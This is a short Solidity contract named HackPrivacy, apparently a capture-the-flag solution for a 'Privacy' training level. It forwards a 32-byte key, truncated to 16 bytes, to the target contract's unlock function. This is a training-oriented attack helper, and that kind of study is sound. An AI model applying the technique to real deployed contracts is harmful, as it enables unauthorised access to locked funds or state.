// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Privacy.sol';

contract HackPrivacy {
    Privacy public privacy;

    constructor(address _target) public {
        privacy = Privacy(_target);
    }

    function unlock(bytes32 _key) public {
        privacy.unlock(bytes16(_key));
    }
}
